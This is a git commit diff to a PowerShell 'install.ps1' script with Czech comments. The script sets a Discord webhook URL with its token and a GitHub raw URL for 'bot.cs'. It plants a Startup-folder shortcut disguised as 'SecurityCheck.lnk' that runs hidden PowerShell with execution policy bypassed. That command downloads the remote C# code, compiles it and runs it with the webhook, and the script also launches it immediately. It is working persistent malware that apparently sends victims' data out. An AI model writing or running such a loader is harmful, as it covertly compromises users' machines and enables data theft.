a2036435f231f583db80fafcb843a2a520f3cef9
jfheifohfai <168677903+jfheifohfai@users.noreply.github.com>
2026-04-11 21:09:53 +0200

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,18 +1,17 @@
 $webhook = "https://discord.com/api/webhooks/1491728198092849215/DkCsPFapma_HMcUuG5GBIt6B9f55h99touvLjLOxvyLijuaTuZT15NO-xzYrJ78S2d2o"
 $github = "https://raw.githubusercontent.com/jfheifohfai/diwidwidid/refs/heads/main/bot.cs"
-$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.lnk"
+$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.lnk"
 
-# Příkaz, který Pico/PowerShell spustí
-$target = "powershell.exe"
-$arg = "-WindowStyle Hidden -Command `"`$w='$webhook'; `$g='$github'; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies 'System.Management','System.Net.Http','System.Drawing','System.Windows.Forms','System.IO'; [Program]::Main(`$w)`""
+# Příkaz pro PowerShell
+$arg = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"`$w='$webhook'; `$g='$github'; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies 'System.Management','System.Net.Http','System.Drawing','System.Windows.Forms','System.IO'; [Program]::Main(`$w)`""
 
-# Vytvoření zástupce (LNK) pomocí COM objektu
+# Vytvoření zástupce (.lnk)
 $shell = New-Object -ComObject WScript.Shell
-$shortcut = $shell.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = $target
+$shortcut = $shell.CreateShortcut($lnkPath)
+$shortcut.TargetPath = "powershell.exe"
 $shortcut.Arguments = $arg
-$shortcut.WindowStyle = 7  # 7 znamená 'Minimalizované'
+$shortcut.WindowStyle = 7
 $shortcut.Save()
 
-# Spustit hned teď pro test
+# Okamžité spuštění pro test
 Start-Process powershell.exe -ArgumentList $arg -WindowStyle Hidden
